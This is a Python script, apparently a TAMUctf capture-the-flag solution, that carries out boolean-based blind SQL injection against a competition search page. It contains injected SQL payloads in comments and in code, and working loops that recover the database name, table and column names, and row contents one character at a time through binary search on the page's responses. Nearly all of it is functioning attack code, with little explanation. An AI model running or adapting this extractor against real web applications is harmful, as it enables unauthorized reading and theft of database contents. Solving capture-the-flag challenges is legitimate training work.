# ' OR (SELECT count(*) FROM (SELECT db_name()) WHERE unicode(substr(0, {}, 1)) > {}) = 1

# ' OR (SELECT count(*) FROM (SELECT * FROM {} ORDER BY 1 LIMIT 1 OFFSET {}) WHERE unicode(substr({}, {}, 1)) > {}) = 1

# ' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%MySQL%') AND ''='

import requests

URL = 'http://web2.tamuctf.com/Search.php'

def query2(guess):
    # payload = "' OR (SELECT count(*) FROM (SELECT * FROM {} ORDER BY 1 LIMIT 1 OFFSET {}) WHERE unicode(substr({}, {}, 1)) > {}) = 1;-- ".format(table, offset, column, index + 1, guess)

    payload = "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '{}%') AND ''='".format(guess)
    return 'Nice' in requests.get(URL, params={'Search':payload}).text

# ' OR ascii(substr((SELECT database()), 1, 1)) > 0 AND ''='

# In MySQL, following will work:
# ' OR EXISTS(SELECT @@VERSION) AND ''='

def get_db_name():
    name = ''
    while True:
        found = False
        for i in range(0x20, 0x7f)[::-1]:
            if chr(i) == '%':
                continue
            if query2(name + chr(i)):
                name += chr(i)
                found = True
                break
        if not found:
            break

        print(name)
    print(name)

# query_get_tables('INFORMATION_SCHEMA.TABLES', 'table_name', offset, i, guess):
def query_get_tables(table, column, offset, index, guess):
    payload = "' OR ascii(substr((SELECT {} FROM {} ORDER BY 1 LIMIT 1 OFFSET {}), {}, 1)) > {} AND ''='".format(column, table, offset,  index + 1, guess)
    return 'Nice' in requests.get(URL, params={'Search': payload}).text

def query_get_columns(table, column, offset, index, guess):
    payload = "' OR ascii(substr((SELECT {} FROM {} WHERE table_name = 'Search' ORDER BY 1 LIMIT 1 OFFSET {}), {}, 1)) > {} AND ''='".format(column, table, offset,  index + 1, guess)
    return 'Nice' in requests.get(URL, params={'Search': payload}).text

def query(offset, index, guess):
    payload = "' OR ascii(substr((SELECT items FROM Search ORDER BY 1 LIMIT 1 OFFSET {}), {}, 1)) > {} AND ''='".format(offset, index + 1, guess)
    return 'Nice' in requests.get(URL, params={'Search': payload}).text


for offset in range(0, 5):
    statement = ''
    for i in range(16):
        low = 0x20
        high = 0x7e
        while low < high:
            guess = (high - low) // 2 + low
            if query(offset, i, guess):
                low = guess + 1
            else:
                high = guess

        # Add the guess to the statement
        result = chr((high - low) // 2 + low)
        statement += result
        print('[{}]: {}'.format(offset, statement))


' OR ascii(substr((DESCRIBE Search ORDER BY 1 LIMIT 1 OFFSET 1), 1, 1)) > 1 AND ''='
